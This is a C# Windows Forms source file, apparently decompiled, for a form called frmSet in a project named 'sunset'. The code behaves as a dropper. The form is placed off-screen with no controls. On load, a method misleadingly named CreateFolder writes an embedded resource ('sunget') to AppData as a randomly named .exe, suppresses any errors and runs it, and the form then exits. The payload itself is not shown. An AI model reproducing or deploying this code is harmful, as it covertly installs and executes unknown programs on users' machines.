using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using sunset.Properties;

namespace sunset;

public class frmSet : Form
{
	private IContainer components;

	public frmSet()
	{
		InitializeComponent();
	}

	private void frmSet_Load(object sender, EventArgs e)
	{
		CreateFolder();
		Application.Exit();
	}

	private void CreateFolder()
	{
		string text = Guid.NewGuid().ToString();
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".exe";
		try
		{
			File.WriteAllBytes(text2, Resources.sunget);
		}
		catch (Exception)
		{
		}
		ProcessStartInfo startInfo = new ProcessStartInfo(text2);
		Process.Start(startInfo);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(124, 23));
		((Form)this).set_ControlBox(false);
		((Form)this).set_Location(new Point(-1000, 0));
		((Control)this).set_Name("frmSet");
		((Form)this).add_Load((EventHandler)frmSet_Load);
		((Control)this).ResumeLayout(false);
	}
}
